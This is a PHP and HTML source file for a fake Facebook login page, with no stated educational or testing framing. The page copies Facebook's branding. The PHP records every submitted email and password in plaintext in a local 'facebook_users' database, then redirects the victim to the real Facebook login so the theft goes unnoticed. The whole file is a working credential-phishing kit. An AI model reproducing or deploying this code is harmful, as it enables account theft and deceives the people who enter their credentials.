<?php
session_start();

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    $username = $_POST['email']; // Assuming email is the username
    $password = $_POST['password']; // Get the password from the form

    // Database connection
    $servername = "localhost";
    $db_username = "root";
    $db_password = "";
    $dbname = "facebook_users";

    // Create connection
    $conn = new mysqli($servername, $db_username, $db_password, $dbname);

    // Check connection
    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }

    // Prepare SQL statement
    $sql = "INSERT INTO users (email, password) VALUES (?, ?)";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("ss", $username, $password);

    // Execute SQL statement
    if ($stmt->execute() === TRUE) {
        // Redirect the user
        header("Location: https://www.facebook.com/login.php/");
        exit(); // Exit to prevent HTML output after header redirect
    } else {
        echo "Error: " . $sql . "<br>" . $conn->error;
    }

    // Close statement and connection
    $stmt->close();
    $conn->close();
}
?>


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <title>Facebook</title>
    <link rel="icon" href="Facebook_Logo_(2019).png.webp" type="image/png">
</head>
<body>
    <div class="box">
        <div class="title-box">
          <img src="https://i.postimg.cc/NMyj90t9/logo.png" alt="Facebook">
          <p>Facebook helps you connect and share with the people in your life.</p>
        </div>
        <div class="form-box">
          <form action="" method="POST"> <!-- Changed action to current page -->
            <input type="text" name="email" placeholder="Email address or phone number">
            <input type="password" name="password" placeholder="Password">
            <button type="submit">Log In</button>
            <a href="#">Forgotten Password</a>
          </form>
          <hr>
          <div class="create-btn">
            <a href="" target="_blank">Create New Account</a>
          </div>
        </div>
      </div>
</body>
</html>
